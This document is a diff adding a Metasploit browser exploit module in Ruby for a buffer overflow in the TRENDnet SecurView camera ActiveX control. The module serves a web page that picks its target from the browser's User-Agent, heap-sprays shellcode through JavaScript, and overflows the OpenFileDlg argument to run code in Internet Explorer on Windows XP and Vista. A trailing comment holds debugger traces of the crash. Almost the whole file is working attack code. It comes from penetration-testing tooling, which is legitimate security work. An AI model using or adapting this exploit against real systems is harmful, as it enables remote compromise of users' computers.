@@ -1,0 +1,201 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+#   http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = NormalRanking
+
+	include Msf::Exploit::Remote::HttpServer::HTML
+
+	def initialize(info={})
+		super(update_info(info,
+			'Name'           => "TRENDnet SecurView Internet Camera UltraMJCam OpenFileDlg Buffer Overflow",
+			'Description'    => %q{
+					This module exploits a vulnerability found in TRENDnet SecurView Internet
+				Camera's ActiveX control.  By supplying a long string of data as the sFilter
+				argument of the OpenFileDlg() function, it is possible to trigger a buffer
+				overflow condition due to WideCharToMultiByte (which converts unicode back to)
+				overwriting the stack more than it should, which results arbitrary code execution
+				under the context of the user.
+			},
+			'License'        => MSF_LICENSE,
+			'Author'         =>
+				[
+					'rgod',   #Original discovery, PoC
+					'sinn3r'  #Metasploit
+				],
+			'References'     =>
+				[
+					[ 'OSVDB', '80661' ],
+					[ 'URL', 'http://www.exploit-db.com/exploits/18675/' ]
+				],
+			'Payload'        =>
+				{
+					'BadChars'        => "\x00",
+					'StackAdjustment' => -3500,
+				},
+			'DefaultOptions'  =>
+				{
+					'ExitFunction'         => "seh",
+					'InitialAutoRunScript' => 'migrate -f',
+				},
+			'Platform'       => 'win',
+			'Targets'        =>
+				[
+					[ 'Automatic', {} ],
+					[ 'IE 6 on Windows XP SP3', { 'Offset' => '0x600', 'Ret' => 0x30303030 } ],
+					[ 'IE 7 on Windows XP SP3', { 'Offset' => '0x600', 'Ret' => 0x30303030 } ],
+					[ 'IE 7 on Windows Vista',  { 'Offset' => '0x600', 'Ret' => 0x30303030 } ]
+				],
+			'Privileged'     => false,
+			'DisclosureDate' => "Mar 28 2012",
+			'DefaultTarget'  => 0))
+	end
+
+	def get_target(agent)
+		#If the user is already specified by the user, we'll just use that
+		return target if target.name != 'Automatic'
+
+		if agent =~ /NT 5\.1/ and agent =~ /MSIE 6/
+			return targets[1]  #IE 6 on Windows XP SP3
+		elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7/
+			return targets[2]  #IE 7 on Windows XP SP3
+		elsif agent =~ /NT 6\.0/ and agent =~ /MSIE 7/
+			return targets[3]  #IE 7 on Windows Vista
+		else
+			return nil
+		end
+	end
+
+	def on_request_uri(cli, request)
+		agent = request.headers['User-Agent']
+		my_target = get_target(agent)
+
+		# Avoid the attack if the victim doesn't have the same setup we're targeting
+		if my_target.nil?
+			print_error("#{cli.peerhost}:#{cli.peerport} - Browser not supported: #{agent.to_s}")
+			send_not_found(cli)
+			return
+		end
+
+		# Set payload depending on target
+		p = payload.encoded
+
+		js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))
+		js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(target.arch))
+
+		# Convert the pivot addr (in decimal format) to binary,
+		# and then break it down to this printable format:
+		# \x41\x41\x41\x41
+		t = [my_target.ret].pack("V").unpack("H*")[0]
+		target_ret = ''
+		0.step(t.length-1, 2) do |i|
+			target_ret << "\\x#{t[i, 2]}"
+		end
+
+		js = <<-JS
+		var heap_obj = new heapLib.ie(0x20000);
+		var code = unescape("#{js_code}");
+		var nops = unescape("#{js_nops}");
+
+		while (nops.length < 0x80000) nops += nops;
+		var offset = nops.substring(0, #{my_target['Offset']});
+		var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
+
+		while (shellcode.length < 0x40000) shellcode += shellcode;
+		var block = shellcode.substring(0, (0x40000-6)/2);
+
+		heap_obj.gc();
+
+		for (var i=1; i < 0x1000; i++) {
+			heap_obj.alloc(block);
+		}
+
+		var ret = "";
+		for (i2=0; i2<30000; i2++) {
+			ret = ret + "#{target_ret}";
+		}
+		obj.OpenFileDlg(ret);
+		JS
+
+		js = heaplib(js, {:noobfu => true})
+
+		html = <<-EOS
+		<html>
+		<head>
+		<script>
+		</script>
+		</head>
+		<body>
+		<object classid='clsid:707ABFC2-1D27-4A10-A6E4-6BE6BDF9FB11' id='obj'></object>
+		<script>
+		#{js}
+		</script>
+		</body>
+		</html>
+		EOS
+
+		print_status("#{cli.peerhost}:#{cli.peerport} - Sending html")
+		send_response(cli, html, {'Content-Type'=>'text/html'})
+
+	end
+
+end
+
+=begin
+bp 1000f952 "r; g"
+bp kernel32!WideCharToMultiByte "r; dc poi(esp+c); .echo; g"
+
+eax=023f4bf4 ebx=1006519c ecx=00000003 edx=0013a170 esi=00038ce0 edi=00000000
+eip=7c80a164 esp=0013a130 ebp=0013a158 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+kernel32!WideCharToMultiByte:
+7c80a164 8bff            mov     edi,edi
+023f4bf4  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.
+023f4c04  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.
+023f4c14  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.
+023f4c24  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.
+023f4c34  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.
+023f4c44  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.
+023f4c54  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.
+023f4c64  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.
+
+ChildEBP RetAddr
+0013a12c 1000f958 kernel32!WideCharToMultiByte
+WARNING: Stack unwind information not available. Following frames may be wrong.
+0013a158 100211d0 UltraMJCamX+0xf958
+0013e24c 77135cd9 UltraMJCamX!DllUnregisterServer+0xeb20
+0013e26c 771362e8 OLEAUT32!DispCallFunc+0x16a
+0013e2fc 10017142 OLEAUT32!CTypeInfo2::Invoke+0x234
+0013e32c 100170e2 UltraMJCamX!DllUnregisterServer+0x4a92
+0013e358 7deac999 UltraMJCamX!DllUnregisterServer+0x4a32
+0013e398 7deacfaf mshtml!InvokeDispatchWithNoThis+0x78
+0013e3d8 7deac9fc mshtml!COleSite::ContextInvokeEx+0x149
+0013e40c 75c71408 mshtml!COleSite::ContextThunk_InvokeEx+0x44
+0013e444 75c71378 jscript!IDispatchExInvokeEx2+0xac
+0013e47c 75c76db3 jscript!IDispatchExInvokeEx+0x56
+0013e4ec 75c710d8 jscript!InvokeDispatchEx+0x78
+0013e534 75c6fab8 jscript!VAR::InvokeByName+0xba
+0013e574 75c6efea jscript!VAR::InvokeDispName+0x43
+0013e598 75c76ff4 jscript!VAR::InvokeByDispID+0xfd
+0013e650 75c7165d jscript!CScriptRuntime::Run+0x16bd
+0013e668 75c71793 jscript!ScrFncObj::Call+0x8d
+0013e6d8 75c5da62 jscript!CSession::Execute+0xa7
+0013e728 75c5e6e7 jscript!COleScript::ExecutePendingScripts+0x147
+
+0:008> r
+eax=78f8f8f8 ebx=1006519c ecx=020bc038 edx=0c0c0c0c esi=020bf4d0 edi=020c0000
+eip=1003a0e9 esp=020bb140 ebp=020bf22c iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+UltraMJCamX!DllUnregisterServer+0x27a39:
+1003a0e9 8917            mov     dword ptr [edi],edx  ds:0023:020c0000=00905a4d
+
+
+The only application-specific component loaded is UltraMJCamX.ocx, but this
+can be unreliable and I'd rather not use that.
+=end
